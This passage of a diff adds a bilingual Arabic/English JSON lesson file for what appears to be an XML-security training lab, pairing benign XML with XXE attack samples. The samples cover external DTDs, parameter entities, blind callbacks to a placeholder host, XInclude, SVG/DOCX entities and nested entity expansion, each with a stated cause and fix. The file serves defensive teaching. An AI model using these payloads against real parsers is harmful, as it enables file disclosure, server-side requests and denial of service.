+      "ar": "امنع حل الموارد الخارجية من مدخل XML غير موثوق.",
+      "en": "Prevent external resource resolution from untrusted XML."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: يسمح حل الكيان بالوصول إلى مورد داخلي في خريطة المختبر.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Entity resolution reaches an internal resource in the fixture map."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. امنع حل الموارد الخارجية من مدخل XML غير موثوق.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Prevent external resource resolution from untrusted XML."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-dtd",
+    "group": "xml",
+    "title": {
+      "ar": "تحميل DTD خارجي",
+      "en": "External DTD loading"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root SYSTEM \"https://dtd.test/entity.dtd\"><root>&sample;</root>"
+    },
+    "cause": {
+      "ar": "يستورد المحلّل تعريفات كيانات من DTD غير موثوق.",
+      "en": "The parser imports entity declarations from an untrusted external DTD."
+    },
+    "fix": {
+      "ar": "عطّل تحميل DTD الخارجي ولا تفوض المدخل لتحديد محلّل الموارد.",
+      "en": "Disable external DTD loading and do not let input control resource resolution."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: يستورد المحلّل تعريفات كيانات من DTD غير موثوق.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: The parser imports entity declarations from an untrusted external DTD."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل تحميل DTD الخارجي ولا تفوض المدخل لتحديد محلّل الموارد.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Disable external DTD loading and do not let input control resource resolution."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-parameter",
+    "group": "xml",
+    "title": {
+      "ar": "Parameter Entity تستورد تعريفاً",
+      "en": "Parameter entity imports declarations"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY % remote SYSTEM \"https://dtd.test/entity.dtd\">%remote;]><root>&sample;</root>"
+    },
+    "cause": {
+      "ar": "تستورد parameter entity تعريفاً يؤدي لقراءة ملف العينة.",
+      "en": "A parameter entity imports a declaration that reads the fixture file."
+    },
+    "fix": {
+      "ar": "عطّل parameter entities وDTD بدلاً من حجب اسم كيان واحد.",
+      "en": "Disable parameter entities and DTD rather than filtering one entity name."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: تستورد parameter entity تعريفاً يؤدي لقراءة ملف العينة.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: A parameter entity imports a declaration that reads the fixture file."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل parameter entities وDTD بدلاً من حجب اسم كيان واحد.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Disable parameter entities and DTD rather than filtering one entity name."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-blind",
+    "group": "xml",
+    "title": {
+      "ar": "حل كيان دون إرجاع المحتوى",
+      "en": "Blind entity resolution"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY sample SYSTEM \"https://callback.test/ping\">]><root>&sample;</root>"
+    },
+    "cause": {
+      "ar": "لا يظهر المحتوى في النص المعاد لكن سجل المحلّل يكشف طلب المورد الوهمي.",
+      "en": "Output hides the content but the resolver log records the fixture request."
+    },
+    "fix": {
+      "ar": "امنع الحل الخارجي ولا تعتمد على عدم ظهور النص كحماية.",
+      "en": "Block external resolution; absent reflected text is not a defense."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: لا يظهر المحتوى في النص المعاد لكن سجل المحلّل يكشف طلب المورد الوهمي.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Output hides the content but the resolver log records the fixture request."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. امنع الحل الخارجي ولا تعتمد على عدم ظهور النص كحماية.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Block external resolution; absent reflected text is not a defense."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-error",
+    "group": "xml",
+    "title": {
+      "ar": "تسريب محتوى عبر تشخيص خطأ",
+      "en": "Expanded data leaks through diagnostics"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY sample SYSTEM \"file:///fixtures/secret.txt\">]><root>&sample;<broken></root>"
+    },
+    "cause": {
+      "ar": "رسالة التشخيص تعرض مقتطفاً من XML بعد توسيع السر.",
+      "en": "Diagnostics include an excerpt of XML after the secret was expanded."
+    },
+    "fix": {
+      "ar": "عطّل الكيانات وارجع خطأ عاماً دون محتوى موسّع.",
+      "en": "Disable entities and return a generic error without expanded content."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: رسالة التشخيص تعرض مقتطفاً من XML بعد توسيع السر.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Diagnostics include an excerpt of XML after the secret was expanded."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل الكيانات وارجع خطأ عاماً دون محتوى موسّع.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Disable entities and return a generic error without expanded content."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-xinclude",
+    "group": "xml",
+    "title": {
+      "ar": "قراءة مورد عبر XInclude",
+      "en": "XInclude reads a fixture resource"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///fixtures/secret.txt\" parse=\"text\"/></root>"
+    },
+    "cause": {
+      "ar": "المعالجة اللاحقة تنفذ XInclude حتى دون DOCTYPE.",
+      "en": "Post-processing resolves XInclude even without a DOCTYPE."
+    },
+    "fix": {
+      "ar": "عطّل XInclude صراحة في مسار معالجة المدخلات.",
+      "en": "Explicitly disable XInclude in the input pipeline."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: المعالجة اللاحقة تنفذ XInclude حتى دون DOCTYPE.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Post-processing resolves XInclude even without a DOCTYPE."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل XInclude صراحة في مسار معالجة المدخلات.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Explicitly disable XInclude in the input pipeline."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-svg",
+    "group": "xml",
+    "title": {
+      "ar": "كيان خارجي داخل SVG",
+      "en": "External entity inside SVG"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>Hello</text></svg>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE svg [<!ENTITY sample SYSTEM \"file:///fixtures/secret.txt\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&sample;</text></svg>"
+    },
+    "cause": {
+      "ar": "يعامل مستورد SVG ملف الصورة كـXML يسمح بالكيانات.",
+      "en": "The SVG importer parses the image as XML with external entities enabled."
+    },
+    "fix": {
+      "ar": "استخدم سياسة XML آمنة عند تحليل SVG؛ الامتداد لا يكفي.",
+      "en": "Use a safe XML policy for SVG; the extension is insufficient."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: يعامل مستورد SVG ملف الصورة كـXML يسمح بالكيانات.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: The SVG importer parses the image as XML with external entities enabled."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. استخدم سياسة XML آمنة عند تحليل SVG؛ الامتداد لا يكفي.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Use a safe XML policy for SVG; the extension is insufficient."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-docx",
+    "group": "xml",
+    "title": {
+      "ar": "كيان داخل XML مستند مضغوط",
+      "en": "XXE inside a DOCX XML entry"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<document><text>Hello</text></document>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE document [<!ENTITY sample SYSTEM \"file:///fixtures/secret.txt\">]><document><text>&sample;</text></document>"
+    },
+    "cause": {
+      "ar": "فك ZIP لا يحمي تحليل word/document.xml الذي يأتي بعده.",
+      "en": "Unpacking ZIP does not secure subsequent word/document.xml parsing."
+    },
+    "fix": {
+      "ar": "طبّق سياسة XML الآمنة داخل ملفات الحاوية أيضاً.",
+      "en": "Apply safe XML policy inside archive containers too."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: فك ZIP لا يحمي تحليل word/document.xml الذي يأتي بعده.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Unpacking ZIP does not secure subsequent word/document.xml parsing."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. طبّق سياسة XML الآمنة داخل ملفات الحاوية أيضاً.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Apply safe XML policy inside archive containers too."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-expansion",
+    "group": "xml",
+    "title": {
+      "ar": "توسع كيانات يتجاوز ميزانية المعالجة",
+      "en": "Entity expansion exceeds a processing budget"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY a \"xxxxxxxxxxxxxxxxxxxx\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">]><root>&c;</root>"
+    },
+    "cause": {
+      "ar": "كيانات داخلية متداخلة تضاعف حجم العمل حتى دون شبكة أو ملف خارجي.",
+      "en": "Nested internal entities amplify processing even without a network or external file."
+    },
+    "fix": {
+      "ar": "عطّل DTD غير الضروري وافرض ميزانيات حجم وعمق وزمن.",
+      "en": "Disable unnecessary DTD and enforce size, depth and time budgets."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: كيانات داخلية متداخلة تضاعف حجم العمل حتى دون شبكة أو ملف خارجي.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: Nested internal entities amplify processing even without a network or external file."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل DTD غير الضروري وافرض ميزانيات حجم وعمق وزمن.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Disable unnecessary DTD and enforce size, depth and time budgets."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  }
+]
